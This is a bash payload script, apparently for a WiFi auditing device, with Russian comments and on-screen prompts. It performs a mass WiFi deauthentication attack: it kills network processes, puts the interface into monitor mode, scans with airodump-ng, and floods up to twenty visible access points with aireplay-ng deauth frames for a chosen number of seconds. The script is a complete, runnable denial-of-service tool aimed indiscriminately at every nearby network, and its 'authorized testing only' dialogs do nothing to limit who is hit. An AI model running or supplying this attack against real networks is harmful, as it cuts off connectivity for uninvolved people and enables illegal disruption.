#!/bin/bash
. /root/payloads/library/nullsec-ui.sh
# Title: Массовая деаут
# Author: bad-antics
# Description: Одновременная деаутация всех сетей
# Category: nullsec/attack

# Автоматически определяет правильный беспроводной интерфейс (экспортирует $IFACE).
# При отсутствии интерфейса показывает диалог ошибки.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

PROMPT "МАССОВАЯ ДЕАУТ

Деаутает ВСЕ видимые
сети одновременно.

Максимальный режим нарушений.
Только для разрешенного тестирования.

Нажмите ОК для продолжения."

INTERFACE="$IFACE"
CHANNEL=$(TEXT_PICKER "Канал (1-14 или all):" "all")

resp=$(CONFIRMATION_DIALOG "ЭТО НАПАДЕНИЕ
НА ВСЕ ВИДИМЫЕ СЕТИ!

Крайне разрушительно.
Только для разрешенного использования.

Подтвердить продолжение?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

# Остановить процессы мониторинга
airmon-ng check kill 2>/dev/null
sleep 1

# Включить режим монитора
airmon-ng start $INTERFACE >/dev/null 2>&1
MON_IF="${INTERFACE}mon"
[ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"

LOG "Монитор: $MON_IF"
SPINNER_START "Сканирую сети..."

# Быстрое сканирование
TEMP_DIR="/tmp/massdeauth_$$"
mkdir -p "$TEMP_DIR"

if [ "$CHANNEL" = "all" ]; then
    timeout 15 airodump-ng $MON_IF -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
else
    timeout 15 airodump-ng $MON_IF -c $CHANNEL -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
fi
sleep 15

SPINNER_STOP

# Разбор целей
TARGETS=$(grep -E "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" "$TEMP_DIR/scan-01.csv" 2>/dev/null | head -20)
COUNT=$(echo "$TARGETS" | wc -l)

PROMPT "НАЙДЕНО $COUNT СЕТЕЙ

Начинаю массовую деаут...

Атака будет идти 60 секунд
или до отмены.

Нажмите ОК для начала."

DURATION=$(NUMBER_PICKER "Длительность (сек):" 60)

SPINNER_START "Деаутаю $COUNT сетей..."

# Атаковать каждую сеть
echo "$TARGETS" | while read LINE; do
    BSSID=$(echo "$LINE" | cut -d',' -f1 | tr -d ' ')
    CH=$(echo "$LINE" | cut -d',' -f4 | tr -d ' ')
    
    if [ -n "$BSSID" ] && [ "$BSSID" != "BSSID" ]; then
        iwconfig $MON_IF channel $CH 2>/dev/null
        aireplay-ng --deauth 100 -a "$BSSID" $MON_IF >/dev/null 2>&1 &
    fi
done

sleep $DURATION

# Убить все процессы aireplay
 killall aireplay-ng 2>/dev/null
SPINNER_STOP

# Очистка
airmon-ng stop $MON_IF 2>/dev/null
rm -rf "$TEMP_DIR"

PROMPT "АТАКА ЗАВЕРШЕНА

Деаутишено $COUNT сетей
в течение $DURATION секунд.

Хаос WiFi достигнут.

Нажмите ОК для выхода."
